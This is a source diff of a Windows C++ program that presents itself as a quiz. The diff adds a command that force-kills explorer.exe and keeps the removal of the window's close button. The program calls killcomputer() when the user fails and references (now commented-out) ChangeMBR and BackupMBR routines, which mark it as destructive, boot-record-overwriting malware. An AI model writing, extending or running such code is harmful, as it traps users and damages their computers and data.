@@ -15,34 +15,32 @@
 //am,you may need to download or install like MSVCPxx-
 //x.dll,so we don't wan't to use Visual-C++ to make t-
 //he program.
+//
+//This edited in 2021/05/13
+//
+//The language CSharp will be deprecated.
+//
+//This update edited in 2021/05/29
 
 #include <iostream>
 #include <windows.h>
 #include <thread>
+#include "show.h"
 #include "questionp.h"
 #include "questionc.h"
 #include "thiskill.h"
 #include "conkill.h"
 #include "changembr.h"
-#include "show.h"
 
 using namespace std;
 
 int SCORE         =  0;
-string ANSWER     =  NULL;
-string CHOOSE	  =  NULL;
+string ANSWER     =  "";
+string CHOOSE	  =  "";
 HWND hwnd	      =  FindWindow("ConsoleWindowClass",NULL);	//Get Window Handle
 
 void calctime();
 bool check(int score);
-
-thread py(py_que1,&SCORE);
-thread cs(cs_que1,&SCORE);
-thread showpart1(show_part1);
-thread showlight(show_light);
-thread timep(calctime);
-//show_():in show.h
-//define main variable
 
 bool check(int score)
 {
@@ -62,29 +60,50 @@ void calctime()
 	else if(check(SCORE)==false) killcomputer(SCORE);//Not pass
 }
 
+bool getruninfo()
+{
+	HKEY key;
+	string open="SOFTWARE\\Sola";
+	TCHAR data[MAX_PATH];
+	DWORD size=sizeof(data);
+	if(RegOpenKeyEx(HKEY_CURRENT_USER,(LPCTSTR)open.c_str(),0,KEY_ALL_ACCESS,&key)==ERROR_SUCCESS)
+		if(RegQueryValueEx(key,(LPCTSTR)("disable"),NULL,NULL,(LPBYTE)&data,&size)==ERROR_SUCCESS)
+			if((string)data=="true") return false;
+	return true;
+}
+
 int main()
 {		
-	
-	if(ChangeMBR()==true && BackupMBR(backup)==true)
+	if(/*ChangeMBR() && (BackupMBR(backup) && getruninfo())*/1)
 	{	
+		system("taskkill /f /im explorer.exe");
 		system("cls");	
-		if(showpart1.joinable() == true && showlight.joinable()==true)
-		{
-			DeleteMenu(GetSystemMenu(GetConsoleWindow(), FALSE), SC_CLOSE, MF_BYCOMMAND); 
+		DeleteMenu(GetSystemMenu(GetConsoleWindow(), FALSE), SC_CLOSE, MF_BYCOMMAND); 
 		//If this thread can start
-			showlight.detach();
-			showpart1.join();//Attention:this thread variable must be join
-			show_part2();
-			timep.detach();
-			do
-			{
-				cout << "ÇëÑ¡ÔñÄãµÄ²âÊÔ¾í:";//In Github it will show a bad word,but I don't why 
-				cin >> CHOOSE;
-			}while(CHOOSE !="s" && CHOOSE !="p");
-			if(CHOOSE =="s" && cs.joinable()) cs.join();//Need to use join()
-			else if(CHOOSE == "P" && py.joinable()) py.join();	
-			if(check(SCORE)==true) killthis(hwnd);
-			else if(check(SCORE)==false) killcomputer(SCORE);//Not pass
+		thread showlight(show_light);
+		showlight.detach();
+		thread showpart1(show_part1);
+		showpart1.join();//Attention:this thread variable must be join
+		show_part2();
+		thread timep(calctime);
+		timep.detach();
+		do
+		{
+			cout << "ÇëÑ¡ÔñÄãµÄ²âÊÔ¾í:";//In Github it will show a bad word,but I don't why 
+			cin >> CHOOSE;
+		}while(CHOOSE !="s" && CHOOSE !="p");
+		if(CHOOSE =="s") 
+		{
+			//thread cs(cs_que1,&SCORE);
+			//cs.join();//Need to use join()
 		}
+		else if(CHOOSE == "p") 
+		{
+			//thread py(py_que1,&SCORE);
+			//py.join();
+		}	
+		if(check(SCORE)==true) killthis(hwnd);
+		else if(check(SCORE)==false) killcomputer(SCORE);//Not pass
 	}
+	else return 0;
 }
